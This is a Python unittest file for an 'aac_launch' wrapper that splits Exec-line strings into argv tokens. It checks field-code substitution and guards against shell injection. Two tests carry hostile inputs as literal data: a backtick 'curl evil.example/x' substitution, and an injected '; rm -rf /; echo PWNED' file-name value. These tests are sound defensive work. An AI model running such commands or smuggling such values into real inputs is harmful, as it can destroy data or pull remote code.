"""Python-side regression tests for the aac_launch wrapper.

Mirrors the Zig test corpus where applicable — the R7 invariant must
hold from Python too: shell metacharacters in extras and exec-lines
pass through as literal bytes when argv tokens are produced.
"""

from __future__ import annotations

import os
import unittest

# Allow the parent zig-out/bin/aac-launch to satisfy AAC_LAUNCH_BINARY
# when running from a fresh checkout in CI.
_here = os.path.dirname(os.path.abspath(__file__))
_repo_root = os.path.abspath(os.path.join(_here, "..", "..", ".."))
_candidate = os.path.join(_repo_root, "zig-out", "bin", "aac-launch")
if "AAC_LAUNCH_BINARY" not in os.environ and os.path.isfile(_candidate):
    os.environ["AAC_LAUNCH_BINARY"] = _candidate

from aac_launch import parse, BinaryNotFound  # noqa: E402


class TestParse(unittest.TestCase):
    def test_bare_argv(self) -> None:
        self.assertEqual(parse("firefox"), ["firefox"])

    def test_multi_word(self) -> None:
        self.assertEqual(parse("code --new-window"), ["code", "--new-window"])

    def test_quoted_segment(self) -> None:
        argv = parse('code "My Project"')
        self.assertEqual(argv, ["code", "My Project"])

    def test_percent_f_substitution(self) -> None:
        self.assertEqual(parse("gvim %f", ["/tmp/x.txt"]), ["gvim", "/tmp/x.txt"])

    def test_percent_F_multiple_files(self) -> None:
        argv = parse("gimp %F", ["a.png", "b.png", "c.png"])
        self.assertEqual(argv, ["gimp", "a.png", "b.png", "c.png"])

    def test_percent_u_url(self) -> None:
        argv = parse("browser %u", ["https://example.com"])
        self.assertEqual(argv, ["browser", "https://example.com"])

    def test_percent_percent_literal(self) -> None:
        self.assertEqual(parse("echo 100%%"), ["echo", "100%"])

    def test_no_shell_expansion_of_dollar(self) -> None:
        # THE load-bearing regression test for R7 — must NEVER fail.
        argv = parse('echo $HOME $(whoami)')
        self.assertIn("$HOME", argv)
        # Each token is a literal byte-string; no shell ever sees them.

    def test_no_shell_expansion_of_backticks(self) -> None:
        # R7 regression test, Python-side.
        argv = parse('echo `curl evil.example/x`')
        joined = " ".join(argv)
        self.assertIn("`", joined)

    def test_injection_via_extras_passes_as_literal(self) -> None:
        # If %f's substitution let a shell metacharacter escape the argv slot,
        # this would be a critical bug.
        argv = parse("cat %f", ["; rm -rf /; echo PWNED"])
        self.assertEqual(argv[1], "; rm -rf /; echo PWNED")

    def test_deprecated_codes_stripped(self) -> None:
        argv = parse("app %i %c %k file")
        self.assertGreaterEqual(len(argv), 2)
        self.assertEqual(argv[0], "app")
        self.assertEqual(argv[-1], "file")

    def test_empty_yields_empty_argv(self) -> None:
        self.assertEqual(parse(""), [])

    def test_only_whitespace_yields_empty(self) -> None:
        self.assertEqual(parse("    \t  "), [])

    def test_long_argument_round_trip(self) -> None:
        long = "x" * 1024
        argv = parse(f"echo {long}")
        self.assertEqual(argv, ["echo", long])

    def test_many_arguments(self) -> None:
        words = ["cmd"] + [chr(ord("a") + i) for i in range(20)]
        argv = parse(" ".join(words))
        self.assertEqual(argv, words)


class TestBinaryResolution(unittest.TestCase):
    def test_missing_binary_raises(self) -> None:
        old = os.environ.get("AAC_LAUNCH_BINARY")
        old_path = os.environ.get("PATH", "")
        try:
            os.environ["AAC_LAUNCH_BINARY"] = "/nonexistent/path/aac-launch"
            with self.assertRaises(BinaryNotFound):
                parse("foo")
        finally:
            if old is not None:
                os.environ["AAC_LAUNCH_BINARY"] = old
            else:
                os.environ.pop("AAC_LAUNCH_BINARY", None)
            os.environ["PATH"] = old_path


if __name__ == "__main__":
    unittest.main()
